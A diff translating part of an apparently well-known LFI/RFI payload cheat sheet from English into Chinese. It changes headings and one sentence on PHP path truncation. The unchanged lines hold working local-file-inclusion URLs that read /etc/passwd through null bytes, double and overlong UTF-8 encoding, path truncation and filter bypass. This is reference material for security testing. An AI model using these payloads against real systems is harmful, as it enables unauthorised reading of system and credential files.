@@ -7,12 +7,12 @@
 ## 概要
 
 * [工具](#工具)
-* [基础本地文件包含](#基础本地文件包含)
+* [基本的本地文件包含](#基本的本地文件包含)
     * [Null字节](#null-字节)
     * [双重编码](#双重编码)
-    * [UTF-8 编码](#utf-8 编码)
-    * [Path and dot truncation](#path-and-dot-truncation)
-    * [Filter bypass tricks](#filter-bypass-tricks)
+    * [UTF-8 编码](#UTF-8 编码)
+    * [路径与.截断](#路径与.截断)
+    * [filter绕过技巧](#filter绕过技巧)
 * [Basic RFI](#basic-rfi)
 * [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
   * [Wrapper php://filter](#wrapper-phpfilter)
@@ -36,7 +36,7 @@
 * [LFISuite - https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
 * [fimap - https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
 
-## Basic LFI
+## 基本的本地文件包含
 
 In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
 
@@ -59,17 +59,15 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
-### UTF-8 encoding
+### UTF-8 编码
 
 ```powershell
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
 
-### Path and dot truncation
-
-On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.
-
+### 路径与.截断
+在大多数安装的PHP中，超过4096个字节的文件名将被切断，因此多余的字符将被丢弃。
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
 http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
@@ -77,7 +75,7 @@ http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
 http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
 ```
 
-### Filter bypass tricks
+### filter绕过技巧
 
 ```powershell
 http://example.com/index.php?page=....//....//etc/passwd
